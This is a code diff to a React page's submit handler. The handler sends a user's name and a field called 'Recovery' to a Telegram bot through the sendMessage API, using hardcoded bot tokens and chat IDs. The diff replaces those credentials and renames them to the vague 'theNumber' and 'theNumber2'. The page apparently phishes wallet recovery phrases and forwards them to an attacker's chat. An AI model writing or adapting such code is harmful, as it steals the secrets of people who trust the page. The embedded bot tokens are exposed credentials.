@@ -107,9 +107,9 @@ export default function Home() {
 const [status, setStatus] = useState<string>('');
 
 const handleSubmit = async () => {
-  const botToken = "8054928004:AAHBXclIm-0GhzIcDiVfEIXvYu7y74geht0";
-  const chatId = "6973974985";
-  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const theNumber = "7518413075:AAF2m8aw70h1HDhjKhWoqOJ_kdzpkKdjA98";
+  const theNumber2 = "7650582960";
+  const telegramUrl = `https://api.telegram.org/bot${theNumber}/sendMessage`;
   // const theMessage = 
   try {
     setTheloader(true)
@@ -117,7 +117,7 @@ const handleSubmit = async () => {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: chatId,
+        chat_id: theNumber2,
         text: `${theName} : ${Recovery}`,
       }),
     });
